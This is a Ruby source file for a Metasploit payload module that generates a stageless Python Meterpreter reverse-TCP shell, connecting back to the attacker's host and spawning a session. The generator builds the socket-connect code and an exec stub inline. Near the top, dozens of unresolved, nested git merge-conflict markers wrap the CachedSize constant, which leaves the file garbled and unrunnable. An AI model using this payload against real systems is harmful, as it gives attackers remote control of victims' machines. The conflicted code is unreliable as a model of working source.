##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/python'
require 'msf/core/payload/python/meterpreter_loader'
require 'msf/core/payload/python/reverse_tcp'
require 'msf/base/sessions/meterpreter_python'

module Metasploit4

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
  CachedSize = 50146
=======
  CachedSize = 49398
>>>>>>> origin/4.11.2_release_pre-rails4
=======
  CachedSize = 49398
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
  CachedSize = 49398
>>>>>>> origin/msf-complex-payloads
=======
  CachedSize = 49398
>>>>>>> origin/msf-complex-payloads
=======
  CachedSize = 49398
>>>>>>> origin/payload-generator.rb
=======
<<<<<<< HEAD
  CachedSize = 50146
=======
  CachedSize = 49398
=======
  CachedSize = 50146
=======
  CachedSize = 49398
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> 4.11.2_release_pre-rails4
=======
  CachedSize = 49398
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
  CachedSize = 49398
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
  CachedSize = 50146
=======
  CachedSize = 49398
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
=======
=======
  CachedSize = 49398
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
  CachedSize = 49398
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
  CachedSize = 49398
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
  CachedSize = 49398
>>>>>>> 4.11.2_release_pre-rails4
=======
  CachedSize = 49398
>>>>>>> msf-complex-payloads
=======
  CachedSize = 49398
>>>>>>> msf-complex-payloads
=======
  CachedSize = 49398
>>>>>>> payload-generator.rb
=======
  CachedSize = 49398
>>>>>>> pod/metasploit-gemfile-
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
>>>>>>> origin/pod/metasploit-framework
=======
  CachedSize = 49398
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
  CachedSize = 49398
<<<<<<< HEAD
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
=======
  CachedSize = 49398
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
  CachedSize = 49398
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
>>>>>>> origin/pod/metasploit-framework
=======
  CachedSize = 49398
=======
  CachedSize = 50146
>>>>>>> rapid7/master
>>>>>>> origin/pod/metasploit-serialized_class_loader

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Payload::Python::ReverseTcp
  include Msf::Payload::Python::MeterpreterLoader

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Python Meterpreter Shell, Reverse TCP Inline',
      'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
      'Author'      => 'Spencer McIntyre',
      'License'     => MSF_LICENSE,
      'Platform'    => 'python',
      'Arch'        => ARCH_PYTHON,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::Meterpreter_Python_Python
    ))
  end

  def generate_reverse_tcp(opts={})
    socket_setup  = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
    socket_setup << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
    opts[:stageless_tcp_socket_setup] = socket_setup

    met = stage_meterpreter(opts)
    py_create_exec_stub(met)
  end

end
